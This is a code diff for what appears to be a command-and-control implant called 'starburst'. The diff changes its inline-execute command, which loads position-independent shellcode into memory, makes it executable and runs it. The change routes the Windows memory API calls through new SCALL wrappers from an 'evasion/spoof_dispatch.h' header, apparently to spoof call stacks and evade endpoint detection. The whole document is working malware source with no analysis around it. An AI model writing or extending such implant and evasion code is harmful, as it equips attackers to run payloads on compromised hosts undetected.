@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_INLINE_EXECUTE
 
@@ -44,7 +45,7 @@ auto declfn starburst::cmd_inline_execute(
     DBG_PRINT( inst, "cmd_inline_execute: %u bytes PIC, %d bytes args\n", pic_len, args_buf_len );
 
     // allocate RW memory for the PIC
-    LPVOID mem = inst.kernel32.VirtualAlloc(
+    LPVOID mem = (LPVOID)SCALL( inst, kernel32.VirtualAlloc,
         nullptr, pic_len,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !mem ) {
@@ -63,15 +64,15 @@ auto declfn starburst::cmd_inline_execute(
             expr::hash_string( "VirtualProtect" ) ) );
 
     if ( !pVirtualProtect ) {
-        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "VirtualProtect resolve failed" ) ) );
         return;
     }
 
     DWORD old_protect = 0;
-    if ( !pVirtualProtect( mem, pic_len, PAGE_EXECUTE_READ, &old_protect ) ) {
-        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
+    if ( !SCALL_PTR( inst, pVirtualProtect, mem, pic_len, PAGE_EXECUTE_READ, &old_protect ) ) {
+        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "VirtualProtect failed" ) ) );
         return;
@@ -82,7 +83,7 @@ auto declfn starburst::cmd_inline_execute(
     pic_fn_ptr( args_buf, args_buf_len );
 
     // free memory
-    inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
+    SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
 
     // build success message
     char msg[96] = { 0 };
